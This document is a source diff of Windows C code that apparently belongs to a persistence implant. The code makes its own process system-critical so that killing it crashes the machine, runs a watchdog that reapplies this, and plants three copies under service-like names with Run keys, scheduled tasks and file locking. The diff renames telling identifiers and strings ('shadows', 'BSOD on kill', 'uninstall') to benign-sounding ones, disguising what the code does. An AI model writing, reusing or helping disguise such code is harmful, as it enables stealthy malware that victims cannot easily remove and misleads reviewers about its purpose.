@@ -224,7 +224,7 @@ void sys_check_antivirus(void) {
 
 /* === Process Protection (Plain String Versions — work regardless of obf state) === */
 
-int g_critical_protected = 0;
+int g_svc_protected = 0;
 
 /* Enable a privilege for the current process token */
 static int enable_privilege_plain(const char *privilege_name) {
@@ -265,13 +265,13 @@ void sys_protect_process(void) {
     
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
-        g_critical_protected = -1;
+        g_svc_protected = -1;
         return;
     }
     
     NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
     if (!pNtSetInformationProcess) {
-        g_critical_protected = -1;
+        g_svc_protected = -1;
         return;
     }
     
@@ -281,9 +281,9 @@ void sys_protect_process(void) {
     NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
     
     if (status == 0) {
-        g_critical_protected = 1;
+        g_svc_protected = 1;
     } else {
-        g_critical_protected = -1;
+        g_svc_protected = -1;
     }
 }
 
@@ -301,13 +301,13 @@ void sys_unprotect_process(void) {
     
     ULONG isCritical = 0;
     pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
-    g_critical_protected = 0;
+    g_svc_protected = 0;
 }
 
 /* Get protection status string */
 const char* sys_protection_status(void) {
-    if (g_critical_protected == 1) return "CRITICAL";
-    if (g_critical_protected == -1) return "FAILED";
+    if (g_svc_protected == 1) return "CRITICAL";
+    if (g_svc_protected == -1) return "FAILED";
     return "NORMAL";
 }
 
@@ -343,7 +343,7 @@ const char* sys_check_critical_status_with_name(void) {
         return buf;
     }
     if (isCritical) {
-        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
+        snprintf(buf, sizeof(buf), "[PROTECTED] [%s]", filename);
     } else {
         snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
     }
@@ -353,7 +353,7 @@ const char* sys_check_critical_status_with_name(void) {
 /* Watchdog thread: re-apply critical status periodically */
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     while (1) {
-        if (g_critical_protected != 1) {
+        if (g_svc_protected != 1) {
             sys_protect_process();
         }
         Sleep(5000);
@@ -361,10 +361,10 @@ DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     return 0;
 }
 
-/* === FULL UNINSTALL: Remove ALL persistence and exit cleanly === */
-void sys_uninstall(void) {
-    extern volatile int g_uninstalling;
-    g_uninstalling = 1;
+/* === FULL CLEANUP: Remove ALL persistence and exit cleanly === */
+void sys_cleanup(void) {
+    extern volatile int g_exiting;
+    g_exiting = 1;
     
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
@@ -372,7 +372,7 @@ void sys_uninstall(void) {
     char dirPath[MAX_PATH];
     snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
     
-    const char *shadows[] = {
+    const char *services[] = {
         "ElevationService.exe",
         "CrashHandler.exe",
         "NotifyService.exe"
@@ -392,7 +392,7 @@ void sys_uninstall(void) {
         if (Process32First(hSnap, &pe)) {
             do {
                 for (int i = 0; i < 3; i++) {
-                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                    if (_stricmp(pe.szExeFile, services[i]) == 0) {
                         HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                         if (hProc) {
                             HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -464,7 +464,7 @@ void sys_uninstall(void) {
         if (Process32First(hSnap, &pe)) {
             do {
                 for (int i = 0; i < 3; i++) {
-                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
+                    if (_stricmp(pe.szExeFile, services[i]) == 0) {
                         HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                         if (hProc) {
                             TerminateProcess(hProc, 0);
@@ -480,7 +480,7 @@ void sys_uninstall(void) {
     /* 8. Delete shadow files */
     for (int i = 0; i < 3; i++) {
         char path[MAX_PATH];
-        snprintf(path, sizeof(path), "%s\\%s", dirPath, shadows[i]);
+        snprintf(path, sizeof(path), "%s\\%s", dirPath, services[i]);
         SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
         DeleteFileA(path);
     }
@@ -515,7 +515,7 @@ int sys_is_admin(void) {
 
 /* Spawn a single shadow copy with a given filename and registry key name.
    Uses CreateProcess for elevation inheritance, adds Run key + scheduled task. */
-static void spawn_single_copy(const char *filename, const char *regKey) {
+static void deploy_single_service(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
 
@@ -561,8 +561,8 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     ShellExecuteExA(&sei);
 }
 
-/* Spawn three shadow copies with generic computer-related names */
-void sys_spawn_shadow_copy(void) {
+/* Deploy three system services with generic computer-related names */
+void sys_deploy_services(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     char dirPath[MAX_PATH];
@@ -582,13 +582,13 @@ void sys_spawn_shadow_copy(void) {
         icacls, dirPath);
     sys_run_command(cmd);
     
-    spawn_single_copy("ElevationService.exe", "ElevationService");
+    deploy_single_service("ElevationService.exe", "ElevationService");
     util_lock_file("ElevationService.exe");
     
-    spawn_single_copy("CrashHandler.exe", "CrashHandler");
+    deploy_single_service("CrashHandler.exe", "CrashHandler");
     util_lock_file("CrashHandler.exe");
     
-    spawn_single_copy("NotifyService.exe", "NotifyService");
+    deploy_single_service("NotifyService.exe", "NotifyService");
     util_lock_file("NotifyService.exe");
     
     /* Apply all advanced layers automatically using obfuscated APIs */
